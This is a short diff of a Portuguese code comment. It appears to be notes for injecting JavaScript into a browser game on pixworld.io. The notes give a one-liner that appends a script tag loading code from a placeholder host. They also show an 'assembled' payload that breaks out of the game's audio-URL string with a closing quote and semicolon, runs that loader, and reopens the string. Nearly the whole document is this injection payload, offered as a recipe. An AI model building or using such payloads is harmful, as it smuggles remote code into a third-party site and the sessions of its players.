@@ -1,13 +1,25 @@
 /*
 
-for(var s=document.createElement('script'),h=document.head;s.src='https://exemplo.com/arquivo.js',h.appendChild(s););
+document.head.appendChild((s => (s.src = 'https://exemplo.com/arquivo.js', s))(document.createElement('script')));
 
 a linha acima adiciona o script ao jogo
 
-https://pixworld.io/intra_wo/intra.php?idsesion=otva4e9chfdig80q731ynzmlrpb5k2swju6x&pag=21&idapp=65661&idioma=en&idapp_gest=65661
+https://pixworld.io/mundo20023
 
 link do jogo
 
-basta adicionar na linha onde incriu o audio no jogo
+https://cdn.pixabay.com/download/audio/2021/09/06/audio_cb1c3e82d9.mp3
+
+link do audio
+
+document.head.appendChild((s => (s.src = 'https://exemplo.com/arquivo.js', s))(document.createElement('script')));
+
+comando para adicionar o raw no script
+
+script montado:
+
+
+https://cdn.pixabay.com/download/audio/2021/09/06/audio_cb1c3e82d9.mp3");document.head.appendChild((s => (s.src = 'https://exemplo.com/arquivo.js', s))(document.createElement('script')));console.log("adicionado
+
 
 */
